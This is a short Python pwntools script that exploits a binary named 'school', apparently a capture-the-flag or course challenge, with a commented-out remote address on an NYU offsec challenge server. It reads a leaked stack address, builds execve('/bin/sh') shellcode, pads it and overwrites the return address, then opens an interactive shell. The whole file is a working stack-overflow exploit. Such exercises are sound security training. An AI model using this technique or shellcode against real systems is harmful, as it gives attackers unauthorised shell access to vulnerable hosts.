from pwn import *

e = ELF('./school')
context.log_level = 'debug'
context.arch = "amd64"
context.terminal = ['alacritty', '-e', 'zsh', '-c']
p = process('./school')

#p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1338)
gdb.attach(p)
print("receiving!!!!")
out = p.recv(1000)
print(out)
#p.sendline("rt1726")

#out = p.recv(1000)
#print(out)
#out = p.recv(1000)
#print(out)
out = out.decode()
index = out.index('x')
rsp = '0' + out[index:index+13]
print(rsp)
shellcode = '''
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
xor esi, esi
push 0x3b
pop rax
cdq
syscall
'''


payload = asm(shellcode).ljust(40, b'A')          # The shellcode
print(payload)

print(rsp)

payload += p64(int(rsp, 16))

p.sendline(payload)
print(p.recvline())
p.interactive()
